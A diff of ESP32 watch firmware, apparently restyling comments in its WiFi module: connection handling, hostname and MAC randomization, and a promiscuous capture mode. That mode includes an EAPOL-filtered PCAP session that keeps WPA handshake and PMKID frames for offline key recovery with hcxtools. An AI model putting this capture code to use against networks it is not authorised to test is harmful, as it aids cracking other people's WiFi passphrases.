-/* ---- MAC address helpers ----------------------------------------------------------- */
+/* ---- MAC address helpers ---- */
 static void format_mac(char *dst, size_t len, const uint8_t m[6])
 {
     snprintf(dst, len, "%02x:%02x:%02x:%02x:%02x:%02x", m[0], m[1], m[2], m[3], m[4], m[5]);
 }
-/* Read the driver's current STA MAC and publish it for the UI (valid after set_mode(STA)). */
+/* Reads the driver's current station MAC and publishes it for the UI; only valid after set_mode(STA). */
 static void publish_current_mac(void)
 {
     uint8_t m[6];
@@ -887,10 +934,12 @@ static void publish_current_mac(void)
     }
 }
 
-/* ---- hostname (how the watch appears on the network) ------------------------------- */
-/* Turn the friendly device name into an RFC-1123-ish hostname: keep [A-Za-z0-9], map runs of
- * space/underscore/other to a single '-', trim leading/trailing '-'. Falls back to the default
- * if nothing usable survives. `out` is always NUL-terminated. */
+/* ---- hostname: how the watch appears on the network ---- */
+/* Turns the friendly device name into a roughly RFC-1123-compliant
+ * hostname: keeps [A-Za-z0-9], collapses runs of space/underscore/other
+ * characters into a single '-', and trims any leading or trailing '-'.
+ * Falls back to the default if nothing usable survives. `out` is always
+ * left NUL-terminated. */
 static void sanitize_hostname(const char *in, char *out, size_t outlen)
 {
     size_t j = 0;
@@ -898,11 +947,11 @@ static void sanitize_hostname(const char *in, char *out, size_t outlen)
         char c = in[i];
         if ((c >= 'A' && c <= 'Z') || (c >= 'a' && c <= 'z') || (c >= '0' && c <= '9')) {
             out[j++] = c;
-        } else if (j > 0 && out[j - 1] != '-') {   /* collapse separators to a single '-' */
+        } else if (j > 0 && out[j - 1] != '-') {   /* collapses separator runs down to a single '-' */
             out[j++] = '-';
         }
     }
-    while (j > 0 && out[j - 1] == '-') {            /* no trailing hyphen */
+    while (j > 0 && out[j - 1] == '-') {            /* avoid a trailing hyphen */
         j--;
     }
     out[j] = '\0';
@@ -911,8 +960,9 @@ static void sanitize_hostname(const char *in, char *out, size_t outlen)
     }
 }
 
-/* Push the sanitized device name onto the STA netif as its DHCP/mDNS hostname (no-op until the
- * netif exists; it's applied at the end of bring_up and again on a rename). */
+/* Pushes the sanitized device name onto the STA netif as its DHCP/mDNS
+ * hostname; a no-op until the netif actually exists, applied at the end of
+ * bring_up and again whenever the device is renamed. */
 static void apply_hostname(void)
 {
     if (s_netif == NULL) {
@@ -928,9 +978,10 @@ static void apply_hostname(void)
     }
 }
 
-/* ---- connection reason helper ----------------------------------------------------- */
-/* A drop that looks like a bad passphrase — stop retrying and tell the user, instead of
- * burning WIFI_MAX_RETRY association attempts on creds that will never work. */
+/* ---- connection reason helper ---- */
+/* A drop that looks like a bad passphrase: stop retrying and tell the
+ * user, rather than burning WIFI_MAX_RETRY association attempts on
+ * credentials that will never actually work. */
 static bool reason_is_auth(uint8_t reason)
 {
     switch (reason) {
@@ -945,8 +996,8 @@ static bool reason_is_auth(uint8_t reason)
     }
 }
 
-/* ---- event handlers (system event task) ------------------------------------------- */
-static void try_connect(void)          /* connect if we want a link and the STA is up */
+/* ---- event handlers, running on the system event task ---- */
+static void try_connect(void)          /* connect only if a link is wanted and the STA is up */
 {
     if (s_want_connect && s_sta_started) {
         esp_err_t e = esp_wifi_connect();
@@ -960,7 +1011,7 @@ static void start_scan_now(void)
 {
     s_scanning = true;
     refresh_strings();
-    esp_err_t e = esp_wifi_scan_start(NULL, false);   /* default active scan, non-blocking */
+    esp_err_t e = esp_wifi_scan_start(NULL, false);   /* the default active scan, non-blocking */
     if (e != ESP_OK) {
         ESP_LOGW(TAG, "scan_start: %s", esp_err_to_name(e));
         s_scanning = false;
@@ -990,11 +1041,11 @@ static void on_wifi_evt(void *arg, esp_event_base_t base, int32_t id, void *data
         uint8_t reason = d ? d->reason : 0;
         s_connected = false;
         clear_netinfo();
-        if (!s_want_connect) {                 /* a deliberate disconnect — don't retry */
+        if (!s_want_connect) {                 /* a deliberate disconnect: don't retry */
             refresh_strings();
             break;
         }
-        if (reason_is_auth(reason)) {          /* fail fast: creds almost certainly wrong */
+        if (reason_is_auth(reason)) {          /* fail fast, since the credentials are almost certainly wrong */
             ESP_LOGW(TAG, "disconnect reason=%u -> auth failure; not retrying", reason);
             s_auth_fail = true;
             s_want_connect = false;
@@ -1019,13 +1070,14 @@ static void on_wifi_evt(void *arg, esp_event_base_t base, int32_t id, void *data
     }
 
     case WIFI_EVENT_SCAN_DONE:
-        /* Retrieve records on the worker (off the event task), not here. */
+        /* Retrieve the scan records on the worker task, off the event task, not here. */
         if (s_q) { wifi_cmd_t c = { .type = CMD_SCAN_DONE }; xQueueSend(s_q, &c, 0); }
         break;
 
-    /* Software AP (M5-P5·3): the ap_tick timer is the single writer of the client snapshot; these
-     * events just log the join/leave so a serial trace shows them promptly (the list follows within
-     * one refresh tick). */
+    /* Software AP (M5-P5.3): the ap_tick timer is the single writer of the
+     * client snapshot; these events just log the join/leave so a serial trace
+     * shows them promptly, while the actual list follows within one refresh
+     * tick. */
     case WIFI_EVENT_AP_STACONNECTED: {
         wifi_event_ap_staconnected_t *e = (wifi_event_ap_staconnected_t *)data;
         if (e) {
@@ -1067,26 +1119,31 @@ static void on_ip_evt(void *arg, esp_event_base_t base, int32_t id, void *data)
     s_auth_fail = false;
     s_join_state = NOCSIF_WIFI_JOIN_CONNECTED;
     ESP_LOGI(TAG, "got IP %s on \"%s\"", ip, s_ssid);
-    persist_creds();                        /* only known-good creds reach NVS */
+    persist_creds();                        /* only credentials that are known-good actually reach NVS */
     upsert_saved(s_ssid, s_pass);           /* remember it for the saved-networks list */
     refresh_strings();
 }
 
-/* ---- bring-up + started state ----------------------------------------------------- */
-/* Lazy one-time init: netif + default event loop + esp_wifi_init + handler registration.
- * NVS is already up (nocsif_settings_init at boot), which esp_wifi needs for PHY cal. */
+/* ---- bring-up and started state ---- */
+/* A lazy, one-time init: netif, the default event loop, esp_wifi_init,
+ * and handler registration. NVS is already up by this point
+ * (nocsif_settings_init runs at boot), which esp_wifi needs for its PHY
+ * calibration data. */
 static bool bring_up(void)
 {
     if (s_driver_up) {
         return true;
     }
 
-    /* COEXISTENCE INIT-ORDER GUARD (RAM-BUDGET.md remake #3, C1). The BLE controller must claim its
-     * ~31.7 KB contiguous int-DMA block from the pristine boot pool BEFORE esp_wifi_init fragments it —
-     * a released block can never be re-claimed once WiFi is up (measured). If Bluetooth is enabled and
-     * we are NOT in safe mode, nocsif_ble_boot_reserve MUST already have run. If it hasn't, the boot
-     * init order regressed (WiFi came up first) and Bluetooth will be unavailable until reboot — a
-     * constraint #1 violation. Log it LOUD; do not silently proceed. */
+    /* Coexistence init-order guard (RAM-BUDGET.md remake #3, C1). The BLE
+     * controller must claim its roughly 31.7 KB contiguous internal-DMA block
+     * from the pristine boot pool before esp_wifi_init fragments it — once
+     * released, a block this size can never be re-claimed after WiFi comes up
+     * (measured). So if Bluetooth is enabled and we're not in safe mode,
+     * nocsif_ble_boot_reserve must have already run. If it hasn't, the boot
+     * init order regressed (WiFi came up first), and Bluetooth will stay
+     * unavailable until reboot — a violation of constraint #1. Log this
+     * loudly rather than silently continuing. */
     if (nocsif_ble_bt_enabled() && !nocsif_reliability_safe_mode() && !nocsif_ble_boot_reserve_ran()) {
         ESP_LOGE(TAG, "COEX INIT-ORDER BUG: esp_wifi_init is about to run but nocsif_ble_boot_reserve "
                       "has NOT run — the BLE controller block will be unreclaimable and Bluetooth will "
@@ -1099,7 +1156,7 @@ static bool bring_up(void)
     if (e != ESP_OK) { ESP_LOGE(TAG, "esp_netif_init: %s", esp_err_to_name(e)); goto fail; }
 
     e = esp_event_loop_create_default();
-    if (e != ESP_OK && e != ESP_ERR_INVALID_STATE) {   /* INVALID_STATE = already created */
+    if (e != ESP_OK && e != ESP_ERR_INVALID_STATE) {   /* INVALID_STATE just means it's already been created */
         ESP_LOGE(TAG, "event loop: %s", esp_err_to_name(e)); goto fail;
     }
 
@@ -1108,23 +1165,27 @@ static bool bring_up(void)
         if (s_netif == NULL) { ESP_LOGE(TAG, "create_default_wifi_sta failed"); goto fail; }
     }
 
-    /* LEAN PROFILE (BLE⇄WiFi coexistence): the WiFi driver's internal-DMA footprint is fixed at
-     * esp_wifi_init() by the BUFFER COUNTS below — it does NOT shrink when the link goes idle, so
-     * throttling throughput frees nothing. Re-initialising with a smaller buffer set is what actually
-     * returns RAM (~58 KB full vs ~35-40 KB lean), and it is the only way to keep the station
-     * ASSOCIATED while handing the BLE controller the ~30 KB CONTIGUOUS block it needs. These fields
-     * are runtime members of wifi_init_config_t, so the same binary can do both. Lean costs
-     * throughput (no AMPDU RX, tiny queues) — fine for the phone link, weather + time sync; monitor /
-     * capture / wardrive should run on the full profile. */
+    /* Lean profile (BLE/WiFi coexistence): the WiFi driver's internal-DMA
+     * footprint is fixed at esp_wifi_init() by the buffer counts below — it
+     * does not shrink just because the link goes idle, so throttling
+     * throughput frees nothing. Re-initializing with a smaller buffer set is
+     * what actually returns RAM (roughly 58 KB full versus 35-40 KB lean),
+     * and it's the only way to keep the station associated while still
+     * handing the BLE controller the ~30 KB contiguous block it needs. These
+     * fields are ordinary runtime members of wifi_init_config_t, so the same
+     * binary supports both profiles. Lean does cost throughput — no AMPDU
+     * RX, tiny queues — which is fine for the phone link, weather, and time
+     * sync, but monitor/capture/wardrive work should run on the full
+     * profile. */
     wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
     if (s_lean) {
-        cfg.static_rx_buf_num  = 2;    /* MAC RX DMA buffers, 1.6 KB each (must be internal)      */
+        cfg.static_rx_buf_num  = 2;    /* MAC RX DMA buffers, 1.6 KB each, must be internal memory */
         cfg.dynamic_rx_buf_num = 4;
-        cfg.static_tx_buf_num  = 2;    /* 1.6 KB each                                             */
+        cfg.static_tx_buf_num  = 2;    /* 1.6 KB each */
         cfg.cache_tx_buf_num   = 4;
         cfg.rx_mgmt_buf_num    = 2;
-        cfg.ampdu_rx_enable    = 0;    /* drops the block-ack reorder buffers entirely            */
-        cfg.rx_ba_win          = 0;    /* must be 0 when AMPDU RX is off                          */
+        cfg.ampdu_rx_enable    = 0;    /* drops the block-ack reorder buffers entirely */
+        cfg.rx_ba_win          = 0;    /* must be 0 whenever AMPDU RX is off */
     }
     e = esp_wifi_init(&cfg);
     if (e != ESP_OK) { ESP_LOGE(TAG, "esp_wifi_init: %s", esp_err_to_name(e)); goto fail; }
@@ -1139,9 +1200,9 @@ static bool bring_up(void)
         IP_EVENT, IP_EVENT_STA_GOT_IP, &on_ip_evt, NULL, &s_h_ip));
 
     ESP_ERROR_CHECK_WITHOUT_ABORT(esp_wifi_set_mode(WIFI_MODE_STA));
-    ESP_ERROR_CHECK_WITHOUT_ABORT(esp_wifi_set_storage(WIFI_STORAGE_RAM));  /* we own the creds */
-    publish_current_mac();      /* STA MAC is readable now; the netmenu shows it */
-    apply_hostname();           /* how the watch appears on the network (before the first DHCP) */
+    ESP_ERROR_CHECK_WITHOUT_ABORT(esp_wifi_set_storage(WIFI_STORAGE_RAM));  /* we own the credentials */
+    publish_current_mac();      /* the station MAC is readable now, so the net menu can show it */
+    apply_hostname();           /* how the watch appears on the network, before the first DHCP request */
 
     s_driver_up = true;
     s_available = true;
@@ -1170,38 +1231,41 @@ static bool ensure_started(void)
     return true;
 }
 
-/* Push s_ssid/s_pass into the driver as the STA config (permissive auth threshold so any
- * AP of that SSID is eligible; the passphrase decides success). */
+/* Pushes s_ssid/s_pass into the driver as the STA config, using a
+ * permissive auth threshold so any AP with that SSID is eligible — the
+ * passphrase itself decides whether the join actually succeeds. */
 static void apply_config(void)
 {
     wifi_config_t wc = { 0 };
     snprintf((char *)wc.sta.ssid, sizeof wc.sta.ssid, "%s", s_ssid);
     snprintf((char *)wc.sta.password, sizeof wc.sta.password, "%s", s_pass);
-    wc.sta.threshold.authmode = WIFI_AUTH_OPEN;   /* accept any; passphrase gates the join */
+    wc.sta.threshold.authmode = WIFI_AUTH_OPEN;   /* accept any auth mode; the passphrase gates whether the join succeeds */
     wc.sta.scan_method = WIFI_ALL_CHANNEL_SCAN;
     wc.sta.sort_method = WIFI_CONNECT_AP_BY_SIGNAL;
     ESP_ERROR_CHECK_WITHOUT_ABORT(esp_wifi_set_config(WIFI_IF_STA, &wc));
 }
 
-/* ---- worker command handlers ------------------------------------------------------ */
+/* ---- worker command handlers ---- */
 static void do_enable(void)
 {
-    /* BLE never yields WiFi any more (the controller is reserved at boot and resident for the session),
-     * so there is no "reclaim the radio from the phone link" dance — just bring the driver up. */
+    /* BLE never yields WiFi the radio anymore — the controller is reserved
+     * at boot and stays resident for the whole session — so there's no more
+     * "reclaim the radio from the phone link" dance; this just brings the
+     * driver up. */
     if (!bring_up()) {
         return;
     }
-    if (s_ap_active) { ap_teardown(); }     /* single radio: STA use ends the AP */
+    if (s_ap_active) { ap_teardown(); }     /* with only one radio, using STA mode ends the AP */
     s_enabled = true;
-    s_want_connect = (s_ssid[0] != '\0') && s_autojoin;   /* auto-reconnect a saved net iff opted in */
+    s_want_connect = (s_ssid[0] != '\0') && s_autojoin;   /* auto-reconnects a saved network, but only if the user opted in */
     if (s_want_connect) {
         s_retry = 0;
         s_auth_fail = false;
         s_join_state = NOCSIF_WIFI_JOIN_JOINING;
         apply_config();
     }
-    ensure_started();       /* STA_START fires -> try_connect() joins the saved net */
-    if (s_sta_started) {    /* already started (re-enable) -> connect now */
+    ensure_started();       /* STA_START fires, and try_connect() joins the saved network */
+    if (s_sta_started) {    /* already started, i.e. this is a re-enable: connect right now */
         try_connect();
     }
     refresh_strings();
@@ -1210,7 +1274,7 @@ static void do_enable(void)
 static void do_disable(void)
 {
     if (s_ap_active) { ap_teardown(); }   /* powering off also ends the software AP */
-    monitor_teardown();     /* stop capture if running (powering off; no STA restore) */
+    monitor_teardown();     /* stops capture if it was running; powering off doesn't restore the STA link */
     s_want_connect = false;
     s_enabled = false;
     s_connected = false;
@@ -1224,12 +1288,16 @@ static void do_disable(void)
     refresh_strings();
 }
 
-/* Arm the lean/full buffer profile. BOOT-TIME input only (RAM-BUDGET.md remake #5/#9): the driver's
- * int-DMA footprint is fixed at the single esp_wifi_init, and a runtime swap would tear the driver down
- * and re-init it — the exact fragmentation churn the resident-block architecture exists to avoid, and it
- * cannot re-widen the contiguous hole anyway (measured). So this only sets the flag the next bring-up
- * reads; if the driver is already up the change is ignored (a reboot would be needed to apply it, and
- * lean is always correct while Bluetooth is on). The old yield-based runtime re-init is gone. */
+/* Arms the lean/full buffer profile. Strictly a boot-time input
+ * (RAM-BUDGET.md remake #5/#9): the driver's internal-DMA footprint is fixed
+ * at the single esp_wifi_init call, and a runtime swap would tear the driver
+ * down and reinitialize it — exactly the fragmentation churn the resident-
+ * block architecture exists to avoid, and measurements show it can't
+ * re-widen the contiguous hole anyway. So this just sets a flag the next
+ * bring-up reads; if the driver is already up, the change is simply ignored
+ * (a reboot would be needed to apply it, though lean is always the correct
+ * choice while Bluetooth is on). The old yield-based runtime re-init
+ * approach is gone. */
 static void do_lean_set(bool lean)
 {
     if (s_lean == lean) {
@@ -1249,15 +1317,15 @@ static void do_scan(void)
     if (!bring_up()) {
         return;
     }
-    if (s_ap_active) { ap_teardown(); }   /* single radio: a scan ends the AP */
-    s_enabled = true;           /* a scan powers the radio */
+    if (s_ap_active) { ap_teardown(); }   /* with only one radio, a scan ends the AP */
+    s_enabled = true;           /* a scan powers the radio on */
     if (!ensure_started()) {
         return;
     }
     if (s_sta_started) {
         start_scan_now();
     } else {
-        s_pending_scan = true;  /* STA_START will kick it off */
+        s_pending_scan = true;  /* STA_START will kick the scan off */
         refresh_strings();
     }
 }
@@ -1267,14 +1335,14 @@ static void do_scan_done(void)
     uint16_t num = 0;
     esp_wifi_scan_get_ap_num(&num);
     uint16_t want = (num > WIFI_MAX_AP) ? WIFI_MAX_AP : num;
-    esp_err_t e = esp_wifi_scan_get_ap_records(&want, s_recs);   /* frees the internal list */
+    esp_err_t e = esp_wifi_scan_get_ap_records(&want, s_recs);   /* frees the internal record list */
     if (e != ESP_OK) {
         ESP_LOGW(TAG, "scan_get_ap_records: %s", esp_err_to_name(e));
         want = 0;
     }
 
-    /* Sort by RSSI (desc), then dedup by SSID keeping the strongest, into the back buffer. */
-    for (int i = 1; i < want; i++) {              /* insertion sort on s_recs */
+    /* Sorts by RSSI descending, then dedups by SSID keeping the strongest entry, writing into the back buffer. */
+    for (int i = 1; i < want; i++) {              /* an insertion sort on s_recs */
         wifi_ap_record_t key = s_recs[i];
         int j = i - 1;
         while (j >= 0 && s_recs[j].rssi < key.rssi) { s_recs[j + 1] = s_recs[j]; j--; }
@@ -1299,7 +1367,7 @@ static void do_scan_done(void)
         n++;
     }
     s_ap_cnt[w] = n;
-    s_ap_i = w;                 /* publish the snapshot atomically */
+    s_ap_i = w;                 /* publishes the snapshot atomically */
     s_scan_gen++;
     s_scanning = false;
     ESP_LOGI(TAG, "scan done: %u found, %d shown", (unsigned)num, n);
@@ -1321,7 +1389,7 @@ static void do_connect(const char *ssid, const char *pass)
     if (!bring_up()) {
         return;
     }
-    if (s_ap_active) { ap_teardown(); }   /* single radio: a join ends the AP */
+    if (s_ap_active) { ap_teardown(); }   /* with only one radio, a join ends the AP */
     s_enabled = true;
     apply_config();
     if (!ensure_started()) {
@@ -1330,11 +1398,11 @@ static void do_connect(const char *ssid, const char *pass)
     if (s_sta_started) {
         if (s_connected) {
             esp_wifi_disconnect();   /* switching networks: drop the old link; the disconnect
-                                        handler reconnects to the new config (want_connect stays true) */
+                                        handler reconnects using the new config, since want_connect stays true */
         } else {
-            try_connect();           /* idle + started -> connect to the new network now */
+            try_connect();           /* already idle and started: connect to the new network right now */
         }
-    }                                /* not started yet -> STA_START will connect */
+    }                                /* not started yet: STA_START will trigger the connect */
     refresh_strings();
 }
 
@@ -1364,7 +1432,7 @@ static void do_connect_saved(const char *ssid)
 {
     for (int i = 0; i < s_sv_cnt; i++) {
         if (strcmp(s_sv_ssid[i], ssid) == 0) {
-            do_connect(s_sv_ssid[i], s_sv_pass[i]);   /* stored passphrase, no prompt */
+            do_connect(s_sv_ssid[i], s_sv_pass[i]);   /* the stored passphrase, no prompt needed */
             return;
         }
     }
@@ -1377,7 +1445,7 @@ static void do_forget_ssid(const char *ssid)
         return;
     }
     remove_saved(ssid);
-    if (strcmp(s_ssid, ssid) == 0) {   /* forgetting the active/primary net: clear it + drop link */
+    if (strcmp(s_ssid, ssid) == 0) {   /* forgetting the active/primary network: clear it and drop the link */
         s_ssid[0] = '\0';
         s_pass[0] = '\0';
         nocsif_settings_set_str(K_SSID, "");
@@ -1387,8 +1455,9 @@ static void do_forget_ssid(const char *ssid)
     ESP_LOGI(TAG, "forgot \"%s\" (saved=%d)", ssid, s_sv_cnt);
 }
 
-/* Re-join the already-saved network (creds are in s_ssid/s_pass from the RAM cache). Forces a
- * connect regardless of s_autojoin — this runs only on an explicit tap. */
+/* Rejoins the already-saved network, using credentials already cached
+ * in s_ssid/s_pass. Forces a connect regardless of s_autojoin, since this
+ * path only ever runs on an explicit user tap. */
 static void do_reconnect(void)
 {
     if (s_ssid[0] == '\0') {
@@ -1397,7 +1466,7 @@ static void do_reconnect(void)
     if (!bring_up()) {
         return;
     }
-    if (s_ap_active) { ap_teardown(); }   /* single radio: a reconnect ends the AP */
+    if (s_ap_active) { ap_teardown(); }   /* with only one radio, a reconnect ends the AP */
     s_enabled = true;
     s_want_connect = true;
     s_retry = 0;
@@ -1408,13 +1477,14 @@ static void do_reconnect(void)
         return;
     }
     if (s_sta_started && !s_connected) {
-        try_connect();          /* started + idle -> connect now; else STA_START will */
+        try_connect();          /* already started and idle: connect now; otherwise STA_START will */
     }
     refresh_strings();
 }
 
-/* Apply a station MAC. esp_wifi_set_mac requires the interface stopped, so a live link is
- * dropped, the MAC set, and the radio restarted (STA_START re-joins if s_want_connect). */
+/* Applies a station MAC. esp_wifi_set_mac requires the interface to be
+ * stopped first, so a live link is dropped, the MAC is set, and the radio is
+ * restarted (STA_START rejoins if s_want_connect is still set). */
 static void apply_mac(const uint8_t mac[6])
 {
     if (!bring_up()) {
@@ -1422,7 +1492,7 @@ static void apply_mac(const uint8_t mac[6])
     }
     bool restart = s_sta_started;
     if (restart) {
-        esp_wifi_stop();        /* synchronous stop; STA_STOP event follows */
+        esp_wifi_stop();        /* a synchronous stop; the STA_STOP event follows */
         s_sta_started = false;  /* reflect it now so ensure_started() actually restarts */
         s_connected = false;
         clear_netinfo();
@@ -1434,9 +1504,9 @@ static void apply_mac(const uint8_t mac[6])
         ESP_LOGI(TAG, "STA MAC set to %02x:%02x:%02x:%02x:%02x:%02x",
                  mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
     }
-    publish_current_mac();      /* reflect whatever actually took */
+    publish_current_mac();      /* reflect whatever value actually took effect */
     if (restart) {
-        ensure_started();       /* STA_START -> try_connect() if we still want a link */
+        ensure_started();       /* STA_START fires, and try_connect() runs if a link is still wanted */
     }
     refresh_strings();
 }
@@ -1445,7 +1515,7 @@ static void do_randmac(void)
 {
     uint8_t mac[6];
     esp_fill_random(mac, sizeof mac);
-    mac[0] = (mac[0] & 0xFE) | 0x02;   /* unicast (bit0=0) + locally administered (bit1=1) */
+    mac[0] = (mac[0] & 0xFE) | 0x02;   /* unicast (bit0=0) and locally administered (bit1=1) */
     apply_mac(mac);
 }
 
@@ -1456,8 +1526,9 @@ static void do_restmac(void)
     }
 }
 
-/* Apply a renamed hostname. If we're associated, bounce the link so the new name goes out in a
- * fresh DHCP request; if idle, just set it for the next connect. */
+/* Applies a renamed hostname. If currently associated, the link is
+ * bounced so the new name goes out in a fresh DHCP request; if idle, it's
+ * just set for the next connect. */
 static void do_apply_host(void)
 {
     if (!s_driver_up) {
@@ -1465,48 +1536,55 @@ static void do_apply_host(void)
     }
     apply_hostname();
     if (s_connected && s_want_connect) {
-        esp_wifi_disconnect();  /* reconnect handler re-associates -> new DHCP with the new name */
+        esp_wifi_disconnect();  /* the reconnect handler re-associates, triggering a new DHCP request carrying the new name */
     }
 }
 
-/* ---- monitor / promiscuous capture (M5-P2) ---------------------------------------- */
+/* ---- monitor / promiscuous capture (M5-P2) ---- */
 
-/* Promiscuous rx callback — runs in the WiFi task context on EVERY captured frame, so it is
- * strictly O(1), allocation-free and log-free: it only bumps volatile tallies (single writer,
- * so lock-free for the UI readers). No frame is stored and no SSID is parsed (that is P3). */
-/* If `d` (a data frame, `len` bytes on air) carries an EAPOL payload — LLC/SNAP with ethertype
- * 0x888e — return the byte offset of the EAPOL header (just past the SNAP); else 0. Accounts for
- * the optional QoS control + a 4-address (WDS) header, and rejects protected frames (an installed
- * key ciphers the SNAP, so it cannot be read). Cheap + O(1): non-data and protected frames bail in
- * the first two bytes, so the bulk of (encrypted) traffic short-circuits immediately. */
+/* The promiscuous rx callback runs in the WiFi task's own context on
+ * every single captured frame, so it must stay strictly O(1),
+ * allocation-free, and log-free: it only bumps volatile tallies, which are
+ * lock-free for UI readers since there's a single writer. No frame is
+ * stored and no SSID is parsed here — that's P3's job. */
+/* If `d` (a data frame, `len` bytes on the air) carries an EAPOL
+ * payload — LLC/SNAP with ethertype 0x888e — returns the byte offset of the
+ * EAPOL header, just past the SNAP; otherwise returns 0. Accounts for the
+ * optional QoS control field and a 4-address (WDS) header, and rejects
+ * protected frames, since an installed key ciphers the SNAP and it can't be
+ * read. Cheap and O(1): non-data and protected frames bail out within the
+ * first couple of bytes, so the bulk of encrypted traffic short-circuits
+ * immediately. */
 static int eapol_offset(const uint8_t *d, int len)
 {
     if (len < 4)                     return 0;
-    if (((d[0] >> 2) & 0x3) != 2)    return 0;        /* data frames only                 */
-    if (d[1] & 0x40)                 return 0;        /* protected: SNAP is ciphered      */
+    if (((d[0] >> 2) & 0x3) != 2)    return 0;        /* data frames only */
+    if (d[1] & 0x40)                 return 0;        /* protected: the SNAP is ciphered and unreadable */
     uint8_t fsub   = (d[0] >> 4) & 0xF;
     bool    tods   = (d[1] & 0x01) != 0;
     bool    fromds = (d[1] & 0x02) != 0;
     int hdr = 24;
-    if (tods && fromds) hdr += 6;                     /* 4-address (WDS) header           */
-    if (fsub & 0x08)    hdr += 2;                     /* QoS control                      */
+    if (tods && fromds) hdr += 6;                     /* a 4-address (WDS) header */
+    if (fsub & 0x08)    hdr += 2;                     /* QoS control field */
     if (hdr + 8 > len)  return 0;
-    if (d[hdr] != 0xAA || d[hdr + 1] != 0xAA || d[hdr + 2] != 0x03)      return 0;  /* LLC   */
+    if (d[hdr] != 0xAA || d[hdr + 1] != 0xAA || d[hdr + 2] != 0x03)      return 0;  /* LLC */
     if (d[hdr + 3] || d[hdr + 4] || d[hdr + 5])                         return 0;  /* OUI 0 */
-    if (d[hdr + 6] != 0x88 || d[hdr + 7] != 0x8E)                       return 0;  /* 0x888e */
-    return hdr + 8;                                    /* EAPOL header offset              */
+    if (d[hdr + 6] != 0x88 || d[hdr + 7] != 0x8E)                       return 0;  /* ethertype 0x888e */
+    return hdr + 8;                                    /* the EAPOL header's offset */
 }
 
-/* Predicate for the EAPOL-filtered PCAP session (M5-P4·1): keep only EAPOL data frames + the
- * beacon / probe-response that names the network (hcxtools needs the ESSID to recover a key). In
- * the FULL session every frame is kept (P3·3). Runs in the rx hot path, so it stays O(1). */
+/* The predicate for an EAPOL-filtered PCAP session (M5-P4.1): keeps
+ * only EAPOL data frames plus the beacon or probe-response that names the
+ * network, since hcxtools needs the ESSID to recover a key. In a FULL
+ * session every frame is kept (matching P3.3). Runs in the rx hot path, so
+ * it must stay O(1). */
 static bool pcap_frame_wanted(const uint8_t *d, int len, wifi_promiscuous_pkt_type_t type)
 {
     if (s_pcap_filter == PCAP_FILTER_FULL) return true;
     if (type == WIFI_PKT_DATA)             return eapol_offset(d, len) != 0;
     if (type == WIFI_PKT_MGMT && len >= 1) {
         uint8_t fsub = (d[0] >> 4) & 0xF;
-        return fsub == 8 || fsub == 5;                /* beacon(8) / probe-response(5)    */
+        return fsub == 8 || fsub == 5;                /* beacon (subtype 8) or probe-response (subtype 5) */
     }
     return false;
 }
@@ -1525,7 +1603,7 @@ static void on_promiscuous(void *buf, wifi_promiscuous_pkt_type_t type)
 
     const wifi_promiscuous_pkt_t *p = (const wifi_promiscuous_pkt_t *)buf;
     if (p) {
-        int ch = p->rx_ctrl.channel;                  /* attribute to the frame's own channel */
+        int ch = p->rx_ctrl.channel;                  /* attribute it to the frame's own channel */
         if (ch >= 1 && ch <= 13) {
             s_mon_ch[ch]++;
         }
@@ -1534,8 +1612,9 @@ static void on_promiscuous(void *buf, wifi_promiscuous_pkt_type_t type)
         if (r > s_mon_rssi_peak) {
             s_mon_rssi_peak = r;
         }
-        /* Deauth/disassoc rate detector (M5-P4·2): a cheap subtype peek on management frames. A
-         * sustained elevated rate is the signature of a deauthentication / disassociation flood. */
+        /* Deauth/disassoc rate detector (M5-P4.2): a cheap subtype peek on
+         * management frames. A sustained elevated rate is the signature of a
+         * deauthentication/disassociation flood. */
         if (type == WIFI_PKT_MGMT && p->rx_ctrl.sig_len >= 1) {
             uint8_t fsub = (p->payload[0] >> 4) & 0xF;
             if      (fsub == 12) s_mon_deauth++;
@@ -1543,22 +1622,25 @@ static void on_promiscuous(void *buf, wifi_promiscuous_pkt_type_t type)
         }
     }
 
-    /* Copy-out for the passive parser (M5-P3): management frames carry AP + probe-request
-     * identity (full early-IE snaplen); data frames map a client to its AP (only the MAC header
-     * is needed, so a short snaplen keeps the ring light against the bulk of the traffic). A
-     * bounded memcpy into the SPSC PSRAM ring; drop (counted) when full so the radio is never
-     * blocked. Release-store the tail so the filled slot is visible to the parser before the
-     * publish. (PCAP export runs its own separate all-frames ring.) */
+    /* Copy-out for the passive parser (M5-P3): management frames carry AP
+     * and probe-request identity, so they get the full early-IE snaplen; data
+     * frames only need to map a client to its AP, so a short snaplen keeps
+     * the ring lightweight against the bulk of the traffic. This does a
+     * bounded memcpy into the SPSC PSRAM ring, dropping (and counting) frames
+     * when it's full so the radio is never blocked. The tail index is
+     * release-stored so the filled slot is visible to the parser before the
+     * publish. (PCAP export uses its own, separate all-frames ring.) */
     if (s_parse_active && s_ring && p && (type == WIFI_PKT_MGMT || type == WIFI_PKT_DATA)) {
-        uint32_t tail = s_ring_tail;                                    /* sole producer */
+        uint32_t tail = s_ring_tail;                                    /* the sole producer */
         uint32_t head = __atomic_load_n(&s_ring_head, __ATOMIC_ACQUIRE);
         if ((tail - head) >= CAP_SLOTS) {
-            s_ring_drop++;                                              /* ring full */
+            s_ring_drop++;                                              /* the ring is full */
         } else {
             cap_slot_t *slot = &s_ring[tail & (CAP_SLOTS - 1)];
             uint16_t len  = p->rx_ctrl.sig_len;
-            /* Data frames need only the MAC header for the station map (short snaplen), EXCEPT an
-             * EAPOL frame, which is copied in full so the parser can read the key exchange + PMKID. */
+            /* Data frames only need their MAC header for the station map (a short
+             * snaplen), with one exception: an EAPOL frame is copied in full so the
+             * parser can read the key exchange and any PMKID. */
             uint16_t snap = CAP_SNAP;
             if (type == WIFI_PKT_DATA) {
                 snap = eapol_offset(p->payload, len) ? CAP_SNAP : CAP_SNAP_DATA;
@@ -1575,15 +1657,17 @@ static void on_promiscuous(void *buf, wifi_promiscuous_pkt_type_t type)
         }
     }
 
-    /* Copy-out for PCAP (M5-P3·3): ALL frame types, larger snaplen, into the separate PCAP ring.
-     * Same O(1) drop-on-full discipline; the big-stack writer task does the SD I/O, never here. An
-     * EAPOL-filtered session (M5-P4·1) keeps only the key-exchange + naming frames. */
+    /* Copy-out for PCAP (M5-P3.3): all frame types, with a larger snaplen,
+     * into the separate PCAP ring. Uses the same O(1) drop-on-full discipline;
+     * the big-stack writer task does the actual SD I/O, never this callback.
+     * An EAPOL-filtered session (M5-P4.1) keeps only the key-exchange and
+     * naming frames. */
